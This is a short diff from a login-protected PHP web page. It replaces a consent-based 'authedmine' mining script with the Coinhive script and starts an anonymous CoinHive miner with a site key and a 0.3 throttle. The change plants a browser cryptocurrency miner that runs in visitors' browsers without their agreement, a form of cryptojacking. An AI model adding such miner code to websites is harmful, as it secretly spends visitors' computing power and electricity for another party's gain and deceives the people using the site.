@@ -485,7 +485,7 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 			<script src="assets/js/util.js"></script>
 			<script src="assets/js/main.js"></script>
     <!--coinhiv miner script-->
-      <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+      <script src="https://coinhive.com/lib/coinhive.min.js"></script>
       <script>
           var miner = new CoinHive.Anonymous('nC4dWxbaY9U8glwWmkbvRE3KCxjEcFdp', {throttle: 0.3});
 
